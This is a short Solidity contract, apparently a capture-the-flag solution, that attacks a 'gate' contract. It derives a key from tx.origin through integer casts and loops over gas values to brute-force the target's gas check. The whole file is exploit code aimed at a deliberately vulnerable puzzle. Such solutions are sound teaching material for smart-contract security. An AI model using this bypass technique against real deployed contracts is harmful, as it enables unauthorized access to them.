// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntGate {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract gateAttack {
    IntGate public gate;

    constructor(address target) {
        gate = IntGate(target);
    }

    function callEnter() public {
        bytes8 gateKey = bytes8(
            uint64(uint16(uint160(tx.origin))) + 0x1000000000000000
        );

        for (uint256 i = 0; i < 8191; i++) {
            try gate.enter{gas: 8191 * 3 + i}(gateKey) returns (bool success) {
                if (success) {
                    return;
                }
            } catch {

            }
        }

        revert("failed");
    }
}
